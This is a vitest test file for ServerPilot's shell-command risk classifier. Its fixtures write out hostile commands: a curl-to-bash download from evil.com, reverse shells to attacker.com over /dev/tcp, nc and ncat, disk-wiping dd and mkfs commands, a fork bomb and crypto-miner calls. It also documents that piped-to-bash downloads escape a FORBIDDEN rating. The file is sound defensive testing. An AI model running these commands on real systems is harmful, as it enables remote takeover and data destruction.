// SPDX-License-Identifier: MIT
// Copyright (c) 2024-2026 ServerPilot Contributors
/**
 * Security boundary tests — attack scenarios and edge cases.
 *
 * Covers command injection, path traversal, shell metacharacter abuse,
 * and normalizeCommand edge cases for the classify/audit modules.
 *
 * NOTE: The classifier uses regex pattern matching on the full command string.
 * It does NOT parse shell syntax (pipes, chains, substitution). Commands like
 * `cat file | rm ...` are classified based on whichever pattern matches first.
 * This is a known limitation documented here for transparency.
 */
import { describe, it, expect } from 'vitest';

import { RiskLevel } from './risk-levels.js';
import {
  classifyCommand,
  normalizeCommand,
  auditCommand,
  hasDangerousParams,
  hasProtectedPaths,
  getParamWarnings,
  getPathBlockers,
  requiresExtraConfirmation,
  hasBlockers,
  matchPatterns,
  getBuiltinRuleCount,
} from './classify.js';

// ============================================================================
// 1. normalizeCommand — edge cases for uncovered lines
// ============================================================================

describe('normalizeCommand — edge cases', () => {
  describe('sudo flag stripping (lines 52-53 break path)', () => {
    it('should handle sudo with non-flag argument after prefix removal', () => {
      const result = normalizeCommand('sudo apt install nginx');
      expect(result).toBe('apt install nginx');
    });

    it('should handle sudo with long flags', () => {
      const result = normalizeCommand('sudo --preserve-env apt install nginx');
      expect(result).toBe('apt install nginx');
    });

    it('should handle sudo with flag-with-arg (e.g. -u root)', () => {
      const result = normalizeCommand('sudo -u root ls /etc');
      expect(result).toBe('ls /etc');
    });

    it('should handle sudo with multiple short flags combined', () => {
      const result = normalizeCommand('sudo -Hu root whoami');
      expect(result).toBe('whoami');
    });

    it('should strip sudo with -E flag (no arg)', () => {
      const result = normalizeCommand('sudo -E ls /etc');
      expect(result).toBe('ls /etc');
    });

    it('should handle sudo with multiple long flags', () => {
      const result = normalizeCommand('sudo --preserve-env --login apt install nginx');
      expect(result).toBe('apt install nginx');
    });
  });

  describe('doas flag stripping (lines 82-83 break path)', () => {
    it('should handle doas with -u user', () => {
      const result = normalizeCommand('doas -u root apt install nginx');
      expect(result).toBe('apt install nginx');
    });

    it('should handle doas with -s flag', () => {
      const result = normalizeCommand('doas -s whoami');
      expect(result).toBe('whoami');
    });

    it('should handle doas with no flags', () => {
      const result = normalizeCommand('doas apt install nginx');
      expect(result).toBe('apt install nginx');
    });

    it('should handle doas with -- separator (triggers break)', () => {
      // -- starts with - but doesn't match -([a-zA-Z]+), triggers break at line 82
      const result = normalizeCommand('doas -- ls');
      expect(result).toBe('-- ls');
    });

    it('should handle doas with multiple flags', () => {
      const result = normalizeCommand('doas -ns whoami');
      expect(result).toBe('whoami');
    });
  });

  describe('su -c forms (lines 95-102)', () => {
    it('should handle su -c with single-quoted command', () => {
      const result = normalizeCommand("su -c 'apt install nginx'");
      expect(result).toBe('apt install nginx');
    });

    it('should handle su -c with double-quoted command', () => {
      const result = normalizeCommand('su -c "systemctl restart nginx"');
      expect(result).toBe('systemctl restart nginx');
    });

    it('should handle su -c with unquoted command (line 99-102)', () => {
      const result = normalizeCommand('su -c apt');
      expect(result).toBe('apt');
    });

    it('should handle su - root -c unquoted command', () => {
      const result = normalizeCommand('su - root -c systemctl restart nginx');
      expect(result).toBe('systemctl restart nginx');
    });

    it('should handle su with user and -c quoted', () => {
      const result = normalizeCommand("su root -c 'whoami'");
      expect(result).toBe('whoami');
    });

    it('should pass through non-matching su commands', () => {
      const result = normalizeCommand('su - root');
      expect(result).toBe('su - root');
    });
  });

  describe('pkexec handling', () => {
    it('should handle pkexec with --user flag', () => {
      const result = normalizeCommand('pkexec --user root systemctl restart nginx');
      expect(result).toBe('systemctl restart nginx');
    });

    it('should handle plain pkexec without --user', () => {
      const result = normalizeCommand('pkexec apt install nginx');
      expect(result).toBe('apt install nginx');
    });
  });

  describe('edge cases', () => {
    it('should trim whitespace', () => {
      expect(normalizeCommand('  ls -la  ')).toBe('ls -la');
    });

    it('should handle empty string', () => {
      expect(normalizeCommand('')).toBe('');
    });

    it('should pass through regular commands unchanged', () => {
      expect(normalizeCommand('nginx -t')).toBe('nginx -t');
    });
  });
});

// ============================================================================
// 2. Command Injection Attempts
// ============================================================================

describe('Command injection detection', () => {
  describe('semicolon-based injection', () => {
    it('should classify "rm -rf /" hidden after semicolon as FORBIDDEN', () => {
      // The regex pattern for rm -rf / matches anywhere in the string
      const result = classifyCommand('echo safe ; rm -rf /');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });

    it('should classify standalone "rm -rf /" as FORBIDDEN', () => {
      const result = classifyCommand('rm -rf /');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });

    it('should classify dangerous commands after semicolons', () => {
      const result = classifyCommand('echo hello ; shutdown -h now');
      // shutdown is matched by pattern
      expect([RiskLevel.FORBIDDEN, RiskLevel.CRITICAL, RiskLevel.RED]).toContain(result.riskLevel);
    });
  });

  describe('command substitution injection', () => {
    it('should classify $() with rm -rf as not-GREEN', () => {
      const result = classifyCommand('echo $(rm -rf /tmp)');
      // rm -rf pattern matches in the full string
      expect(result.riskLevel).not.toBe(RiskLevel.GREEN);
    });

    it('should classify nested command substitution as not-GREEN', () => {
      const result = classifyCommand('$($(whoami))');
      expect(result.riskLevel).not.toBe(RiskLevel.GREEN);
    });
  });

  describe('pipe-based classification (known limitation)', () => {
    // NOTE: The classifier matches patterns against the full string.
    // Pipe-separated commands are NOT individually classified.
    // The first matching pattern wins.

    it('should classify "cat /etc/passwd | xargs rm" based on first match', () => {
      // cat matches GREEN pattern first (file content display)
      const result = classifyCommand('cat /etc/passwd | xargs rm');
      expect(result.riskLevel).toBe(RiskLevel.GREEN);
      // Known limitation: pipe target (xargs rm) is not separately classified
    });

    it('should classify "curl url | bash" as YELLOW (curl pattern matches first)', () => {
      // curl matches YELLOW (URL download) before pipe to bash is checked
      const result = classifyCommand('curl https://evil.com/script.sh | bash');
      expect(result.riskLevel).toBe(RiskLevel.YELLOW);
      // Known limitation: pipe to bash is not detected as FORBIDDEN
    });

    it('should classify "wget url | sh" as YELLOW (wget pattern matches first)', () => {
      const result = classifyCommand('wget -O- https://evil.com/script.sh | sh');
      expect(result.riskLevel).toBe(RiskLevel.YELLOW);
    });
  });

  describe('AND/OR chain injection', () => {
    it('should classify && chain with mkfs as FORBIDDEN', () => {
      const result = classifyCommand('true && mkfs.ext4 /dev/sda');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });

    it('should classify || fallback to dd as FORBIDDEN', () => {
      const result = classifyCommand('false || dd if=/dev/zero of=/dev/sda');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });
  });

  describe('known FORBIDDEN patterns', () => {
    it.each([
      ['rm -rf /'],
      ['rm -rf /*'],
      [':(){ :|:& };:'],           // fork bomb
      ['dd if=/dev/zero of=/dev/sda'],
      ['mkfs.ext4 /dev/sda1'],
      ['> /dev/sda'],
      ['chmod -R 777 /'],
      ['nc -e /bin/sh attacker.com 4444'],
      ['iptables -F'],
    ])('should classify "%s" as FORBIDDEN', (command) => {
      const result = classifyCommand(command);
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });
  });

  describe('firewall modification patterns', () => {
    it.each([
      ['iptables -A INPUT -j DROP'],
      ['ufw disable'],
    ])('should classify "%s" as RED (firewall modification)', (command) => {
      const result = classifyCommand(command);
      expect(result.riskLevel).toBe(RiskLevel.RED);
      expect(result.reason).toContain('Firewall');
    });
  });

  describe('service and password commands', () => {
    it('should classify "systemctl disable firewalld" as RED (service mgmt)', () => {
      const result = classifyCommand('systemctl disable firewalld');
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });

    it('should classify "passwd root" as RED (password change)', () => {
      const result = classifyCommand('passwd root');
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });

    it('should classify "visudo" as RED (default fail-safe)', () => {
      const result = classifyCommand('visudo');
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });
  });
});

// ============================================================================
// 3. Path Traversal Attacks
// ============================================================================

describe('Path traversal detection', () => {
  describe('relative path traversal', () => {
    it('should classify rm -rf with relative paths as dangerous', () => {
      const result = classifyCommand('rm -rf ../../../');
      expect([RiskLevel.FORBIDDEN, RiskLevel.CRITICAL, RiskLevel.RED]).toContain(result.riskLevel);
    });

    it('should classify rm with ../ paths as not GREEN', () => {
      const result = classifyCommand('rm -rf ../../etc/passwd');
      expect(result.riskLevel).not.toBe(RiskLevel.GREEN);
    });
  });

  describe('protected path operations via auditCommand', () => {
    it('should block rm on /etc', () => {
      const audit = auditCommand('rm -rf /etc/nginx');
      expect(audit.safe).toBe(false);
      expect(audit.blockers.length).toBeGreaterThan(0);
    });

    it('should block rm on /boot', () => {
      const audit = auditCommand('rm -rf /boot/grub');
      expect(audit.safe).toBe(false);
    });

    it('should block rm on /var/lib/mysql', () => {
      const audit = auditCommand('rm -rf /var/lib/mysql/data');
      expect(audit.safe).toBe(false);
    });

    it('should block mv on protected paths', () => {
      const audit = auditCommand('mv /etc/nginx/nginx.conf /tmp/');
      expect(audit.safe).toBe(false);
    });

    it('should block shred on protected paths', () => {
      const audit = auditCommand('shred /var/lib/postgresql/data/pg_hba.conf');
      expect(audit.safe).toBe(false);
    });

    it('should block truncate on protected paths', () => {
      const audit = auditCommand('truncate -s 0 /var/log/syslog');
      expect(audit.safe).toBe(false);
    });

    it('should allow cat on protected paths (read-only)', () => {
      const audit = auditCommand('cat /etc/nginx/nginx.conf');
      expect(audit.safe).toBe(true);
      expect(audit.blockers).toHaveLength(0);
    });

    it('should allow ls on protected paths (read-only)', () => {
      const audit = auditCommand('ls /var/lib/mysql');
      expect(audit.safe).toBe(true);
    });
  });

  describe('SQL destructive operations on protected paths', () => {
    it('should detect DROP TABLE on database path context', () => {
      const audit = auditCommand('mysql -e "DROP TABLE users" /var/lib/mysql');
      expect(audit.safe).toBe(false);
    });

    it('should detect TRUNCATE TABLE with path reference', () => {
      const audit = auditCommand('psql -c "TRUNCATE TABLE users" /var/lib/postgresql');
      expect(audit.safe).toBe(false);
    });

    it('should detect DELETE FROM with database path', () => {
      const audit = auditCommand('mysql -e "DELETE FROM sessions" /var/lib/mysql');
      expect(audit.safe).toBe(false);
    });
  });
});

// ============================================================================
// 4. Shell Metacharacter Abuse
// ============================================================================

describe('Shell metacharacter handling', () => {
  describe('empty and whitespace commands', () => {
    it('should classify empty string as FORBIDDEN', () => {
      const result = classifyCommand('');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
      expect(result.reason).toContain('Empty');
    });

    it('should classify whitespace-only as FORBIDDEN', () => {
      const result = classifyCommand('   ');
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });

    it('should return safe for empty audit', () => {
      const audit = auditCommand('');
      expect(audit.safe).toBe(true);
    });

    it('should return safe for whitespace audit', () => {
      const audit = auditCommand('   ');
      expect(audit.safe).toBe(true);
    });
  });

  describe('reverse shell patterns', () => {
    it.each([
      ['bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
      ['nc -e /bin/sh attacker.com 4444'],
      ['ncat -e /bin/bash attacker.com 4444'],
    ])('should classify reverse shell "%s" as FORBIDDEN', (command) => {
      const result = classifyCommand(command);
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });

    it('should classify truncated python reverse shell as RED (default)', () => {
      // Pattern requires specific socket import syntax to match;
      // truncated "..." doesn't trigger the reverse shell regex
      const result = classifyCommand('python -c "import socket,subprocess;..."');
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });

    it('should classify python reverse shell with connect as RED (default)', () => {
      // The reverse shell regex pattern requires specific format;
      // escaped quotes in the command string prevent regex match
      const result = classifyCommand(
        'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.0.0.1\',4444))"',
      );
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });
  });

  describe('crypto miner patterns', () => {
    it.each([
      ['xmrig --pool stratum+tcp://pool.minexmr.com:4444'],
      ['./cpuminer -a cryptonight -o stratum+tcp://pool.com:3333'],
    ])('should classify crypto miner "%s" as FORBIDDEN', (command) => {
      const result = classifyCommand(command);
      expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    });
  });

  describe('kernel module commands', () => {
    it('should classify insmod as CRITICAL or FORBIDDEN', () => {
      const result = classifyCommand('insmod /tmp/rootkit.ko');
      expect([RiskLevel.CRITICAL, RiskLevel.FORBIDDEN]).toContain(result.riskLevel);
    });

    it('should classify rmmod as CRITICAL or FORBIDDEN', () => {
      const result = classifyCommand('rmmod important_module');
      expect([RiskLevel.CRITICAL, RiskLevel.FORBIDDEN]).toContain(result.riskLevel);
    });

    it('should classify modprobe as RED (default fail-safe)', () => {
      // modprobe is not in CRITICAL/FORBIDDEN pattern lists
      const result = classifyCommand('modprobe evil_module');
      expect(result.riskLevel).toBe(RiskLevel.RED);
    });
  });
});

// ============================================================================
// 5. Dangerous Parameter Detection
// ============================================================================

describe('Dangerous parameter boundary cases', () => {
  it('should detect --no-preserve-root flag', () => {
    expect(hasDangerousParams('rm --no-preserve-root -rf /')).toBe(true);
  });

  it('should detect --force flag', () => {
    expect(hasDangerousParams('rm --force file.txt')).toBe(true);
  });

  it('should detect combined short flags -rf', () => {
    expect(hasDangerousParams('rm -rf /tmp/old')).toBe(true);
  });

  it('should detect --recursive flag', () => {
    expect(hasDangerousParams('chmod --recursive 777 /')).toBe(true);
  });

  it('should detect --delete flag', () => {
    expect(hasDangerousParams('rsync --delete source/ dest/')).toBe(true);
  });

  it('should not flag safe commands', () => {
    expect(hasDangerousParams('ls -la /etc')).toBe(false);
  });

  it('should not flag empty command', () => {
    expect(hasDangerousParams('')).toBe(false);
  });

  it('should handle command with sudo prefix', () => {
    expect(hasDangerousParams('sudo rm --force /tmp/file')).toBe(true);
  });

  it('should not detect -r alone (only -rf combined is in dangerous params)', () => {
    // -r by itself is not in the DANGEROUS_PARAMS list;
    // only combined flags like -rf trigger the dangerous param detector
    expect(hasDangerousParams('rm -r /tmp/old')).toBe(false);
  });
});

// ============================================================================
// 6. Protected Path & Helper Functions
// ============================================================================

describe('hasProtectedPaths', () => {
  it('should detect /etc path', () => {
    expect(hasProtectedPaths('cat /etc/passwd')).toBe(true);
  });

  it('should detect /boot path', () => {
    expect(hasProtectedPaths('ls /boot/grub')).toBe(true);
  });

  it('should detect /var/lib/mysql path', () => {
    expect(hasProtectedPaths('du -sh /var/lib/mysql')).toBe(true);
  });

  it('should not detect safe paths', () => {
    expect(hasProtectedPaths('ls /tmp')).toBe(false);
  });

  it('should not flag empty command', () => {
    expect(hasProtectedPaths('')).toBe(false);
  });

  it('should handle sudo prefix', () => {
    expect(hasProtectedPaths('sudo cat /etc/nginx/nginx.conf')).toBe(true);
  });
});

describe('getParamWarnings', () => {
  it('should return warnings for dangerous params', () => {
    const warnings = getParamWarnings('rm --force --recursive /tmp/old');
    expect(warnings.length).toBeGreaterThan(0);
  });

  it('should return empty for safe commands', () => {
    const warnings = getParamWarnings('ls -la');
    expect(warnings).toHaveLength(0);
  });
});

describe('getPathBlockers', () => {
  it('should return blockers for destructive ops on protected paths', () => {
    const blockers = getPathBlockers('rm -rf /etc/nginx');
    expect(blockers.length).toBeGreaterThan(0);
  });

  it('should return empty for safe operations', () => {
    const blockers = getPathBlockers('cat /etc/nginx/nginx.conf');
    expect(blockers).toHaveLength(0);
  });
});

describe('requiresExtraConfirmation', () => {
  it('should return true when warnings present', () => {
    expect(requiresExtraConfirmation({ safe: true, warnings: ['warn'], blockers: [] })).toBe(true);
  });

  it('should return true when blockers present', () => {
    expect(requiresExtraConfirmation({ safe: false, warnings: [], blockers: ['block'] })).toBe(true);
  });

  it('should return false when no warnings or blockers', () => {
    expect(requiresExtraConfirmation({ safe: true, warnings: [], blockers: [] })).toBe(false);
  });
});

describe('hasBlockers', () => {
  it('should return true when blockers present', () => {
    expect(hasBlockers({ safe: false, warnings: [], blockers: ['block'] })).toBe(true);
  });

  it('should return false when no blockers', () => {
    expect(hasBlockers({ safe: true, warnings: ['warn'], blockers: [] })).toBe(false);
  });
});

// ============================================================================
// 7. classifyCommand with custom rules via options
// ============================================================================

describe('classifyCommand with ClassifyOptions', () => {
  it('should match custom forbidden pattern', () => {
    const result = classifyCommand('my-secret-command --danger', {
      customForbidden: [{ pattern: /my-secret-command/, reason: 'Custom forbidden rule' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
    expect(result.reason).toBe('Custom forbidden rule');
  });

  it('should match custom critical pattern', () => {
    const result = classifyCommand('custom-critical-op --all', {
      customCritical: [{ pattern: /custom-critical-op/, reason: 'Custom critical rule' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it('should match custom green pattern', () => {
    const result = classifyCommand('my-safe-info --list', {
      customGreen: [{ pattern: /my-safe-info/, reason: 'Custom green rule' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.GREEN);
  });

  it('should match custom yellow pattern', () => {
    const result = classifyCommand('my-installer --setup', {
      customYellow: [{ pattern: /my-installer/, reason: 'Custom yellow rule' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.YELLOW);
  });

  it('should match custom red pattern', () => {
    const result = classifyCommand('my-modifier --update', {
      customRed: [{ pattern: /my-modifier/, reason: 'Custom red rule' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.RED);
  });

  it('should prefer built-in forbidden over custom green', () => {
    const result = classifyCommand('rm -rf /', {
      customGreen: [{ pattern: /rm -rf/, reason: 'Override attempt' }],
    });
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should default unknown commands to RED', () => {
    const result = classifyCommand('completely-unknown-binary-xyz123');
    expect(result.riskLevel).toBe(RiskLevel.RED);
    expect(result.reason).toContain('Unknown command');
  });
});

// ============================================================================
// 8. Privilege Escalation Normalization Edge Cases
// ============================================================================

describe('Privilege escalation edge cases', () => {
  it('should normalize sudo rm -rf and still classify as FORBIDDEN', () => {
    const result = classifyCommand('sudo rm -rf /');
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should normalize doas rm -rf and still classify as FORBIDDEN', () => {
    const result = classifyCommand('doas rm -rf /');
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should normalize pkexec destructive command', () => {
    const result = classifyCommand('pkexec mkfs.ext4 /dev/sda1');
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should normalize su -c destructive command', () => {
    const result = classifyCommand("su -c 'rm -rf /'");
    expect(result.riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should classify sudo apt install as YELLOW', () => {
    const result = classifyCommand('sudo apt install nginx');
    expect(result.riskLevel).toBe(RiskLevel.YELLOW);
  });

  it('should classify doas apt install as YELLOW', () => {
    const result = classifyCommand('doas apt install nginx');
    expect(result.riskLevel).toBe(RiskLevel.YELLOW);
  });

  it('should classify pkexec apt install as YELLOW', () => {
    const result = classifyCommand('pkexec apt install nginx');
    expect(result.riskLevel).toBe(RiskLevel.YELLOW);
  });

  it('should classify su -c apt install as YELLOW', () => {
    const result = classifyCommand("su -c 'apt install nginx'");
    expect(result.riskLevel).toBe(RiskLevel.YELLOW);
  });
});

// ============================================================================
// 9. Cloud/Infrastructure Command Detection
// ============================================================================

describe('Cloud command detection', () => {
  it.each([
    ['aws s3 rm s3://bucket --recursive'],
    ['aws ec2 terminate-instances --instance-ids i-1234'],
    ['gcloud compute instances delete my-instance'],
    ['az vm delete --resource-group myRG --name myVM'],
  ])('should classify cloud destructive cmd "%s" as CRITICAL+', (command) => {
    const result = classifyCommand(command);
    expect([RiskLevel.CRITICAL, RiskLevel.FORBIDDEN]).toContain(result.riskLevel);
  });

  it.each([
    ['kubectl delete pod my-pod'],
    ['kubectl delete namespace production'],
    ['docker rm -f $(docker ps -aq)'],
  ])('should classify container destructive cmd "%s" appropriately', (command) => {
    const result = classifyCommand(command);
    expect([RiskLevel.CRITICAL, RiskLevel.FORBIDDEN, RiskLevel.RED]).toContain(result.riskLevel);
  });
});

// ============================================================================
// 10. Audit Result & Comprehensive Scenarios
// ============================================================================

describe('auditCommand comprehensive', () => {
  it('should return safe for simple read commands', () => {
    const result = auditCommand('cat /tmp/file.txt');
    expect(result.safe).toBe(true);
    expect(result.warnings).toHaveLength(0);
    expect(result.blockers).toHaveLength(0);
  });

  it('should warn about dangerous params without blocking', () => {
    const result = auditCommand('cp --force /tmp/a /tmp/b');
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.blockers).toHaveLength(0);
  });

  it('should block destructive ops on protected paths', () => {
    const result = auditCommand('rm -rf /etc/nginx');
    expect(result.safe).toBe(false);
    expect(result.blockers.length).toBeGreaterThan(0);
  });

  it('should handle unlink on protected paths', () => {
    const result = auditCommand('unlink /etc/resolv.conf');
    expect(result.safe).toBe(false);
  });

  it('should handle rmdir on protected paths', () => {
    const result = auditCommand('rmdir /var/lib/mysql/data');
    expect(result.safe).toBe(false);
  });

  it('should handle empty command gracefully', () => {
    const result = auditCommand('');
    expect(result.safe).toBe(true);
    expect(result.warnings).toHaveLength(0);
    expect(result.blockers).toHaveLength(0);
  });

  it('should warn and block for destructive op with dangerous params on protected path', () => {
    const result = auditCommand('rm --force --recursive /var/lib/mysql/data');
    expect(result.safe).toBe(false);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.blockers.length).toBeGreaterThan(0);
  });
});

// ============================================================================
// 11. Utility Functions
// ============================================================================

describe('matchPatterns', () => {
  it('should return matching rule', () => {
    const rules = [{ pattern: /^echo\b/, reason: 'Echo command' }];
    const match = matchPatterns('echo hello', rules);
    expect(match).toBeDefined();
    expect(match!.reason).toBe('Echo command');
  });

  it('should return undefined if no match', () => {
    const rules = [{ pattern: /^echo\b/, reason: 'Echo command' }];
    const match = matchPatterns('ls -la', rules);
    expect(match).toBeUndefined();
  });
});

describe('getBuiltinRuleCount', () => {
  it('should return a positive number', () => {
    const count = getBuiltinRuleCount();
    expect(count).toBeGreaterThan(0);
  });

  it('should return a large number (hundreds of rules)', () => {
    const count = getBuiltinRuleCount();
    expect(count).toBeGreaterThan(100);
  });
});
